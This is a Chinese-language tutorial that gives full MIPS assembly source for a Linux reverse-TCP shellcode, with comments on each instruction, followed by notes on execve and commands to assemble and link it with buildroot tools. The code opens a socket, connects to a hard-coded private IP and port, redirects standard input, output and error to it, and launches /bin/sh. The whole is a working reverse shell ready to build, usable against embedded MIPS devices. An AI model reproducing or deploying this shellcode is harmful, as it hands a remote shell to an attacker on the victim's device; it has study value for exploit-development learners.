
## 一：Reverse_Tcp汇编源码
### 1.1 源码
~~~
.section .text
.global __start
.set noreorder
__start:

#sys_socket
#ao = admin
#a1 = type
#a2 = protocol
li $t7,-6			
nor $t7,$t7,$zero  	 //$t7 = not($t7 or $zero) = 5
addi $a0,$t7,-3		 //$a0 = 2		
addi $a1,$t7,-3		 //$a1 = 2
slti $a2,$zero,-1	 //$a2 = 0
li   $v0, 0x1057	 //sys_socket系统调用号，通过动态调试C语言版本的代码获得
syscall        

#connect
#a0 = socket
#a1 = ser_addr(family(word),port(word),ip(dword),0(qword))
#a2 = len
sw $v0,-1($sp)	 	//$v0 = sys_socket返回值
lw $a0,-1($sp)		//$a0 = $v0
li $t7,0xfffd		------------------------------
nor $t7,$t7,$zero
sw $t7,-32($sp)		//$t7 = 0000 0002(family)
lui $t6,0x7777
ori $t6,$t6,0x7777
sw $t6,-28($sp)		//$t6 = 7777 7777(port)
lui $t6,0xc0a8
ori $t6,$t6,0x1f69	//$t6 = c0a8 1f69(ip address)
sw $t6,-26($sp)		
addiu $a1,$sp,-30   //$a1 = ser_addr
li $t4,-17		   ------------------------------
nor $a2,$t4,$zero	//$a2 = ser_addr len
li  $v0, 0x104A	   ------------------------------
syscall

#dup2
#a0 = oldfd
#a1 = newfd(0,1,2)
li $s1,-3
nor $s1,$s1,$zero 			//$s1 = 2(0：标准输入 1：标准输出 2：标准错误)
lw $a0,-1($sp)				//$a0 = sys_socket返回值		
dup2_loop:move $a1,$s1		//$a1 = $s1
li $v0, 0xFDF
syscall
li $s0,-1					//$s0 = -1
addi $s1,$s1,-1				//$s1-=$s1
bne $s1,$s0,dup2_loop		//$s1!=$s0 进行循环

#execve
#a0 = filename
#a1 = argv
#a2 = envp
slti $a2,$zero,-1			//$a2 = 0			
lui $t7,0x2f2f
ori $t7,$t7,0x6269
sw $t7,-20($sp)     	    //$t7 = -20($sp) = 2f2f 6269 (//bi)
lui $t6,0x6e2f
ori $t6,$t6,0x7368			//$t6 = 6e2f 7368(n/sh)
sw $t6,-16($sp)
sw $zero,-12($sp)			
addiu $a0,$sp,-20			//$a0 = //bin/sh
sw $a0,-8($sp)
sw $zero,-4($sp)
addiu $a1,$sp,-8			//$a1 = &(//bin/sh)
li $v0, 0xFAB
syscall
~~~

### 1.2 execve函数定义
1、execve的定义形式：int execve(const char *filename, char *const argv[], char *const envp[]);

2、参数说明：

const char *filename：执行文件的完整路径。

char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名。

char *const envp[]：一般传递NULL，表示可变参数的结尾。

## 二：如何编译此段汇编代码
### mips-linux-as
位于跨平台编译工具buildroot中用来编译汇编源码，-o参数将指定文件编译为中间文件
例如本例中：
~~~
mips-linux-as -o s.o ./reverse_tcp_asm.S
~~~
### mips-linux-ld
位于跨平台编译工具buildroot中用来链接中间文件，-o参数将指定文件链接为可执行文件
例如本例中：
~~~
mips-linux_ld s.o -o ./reverse_tcp_asm
~~~



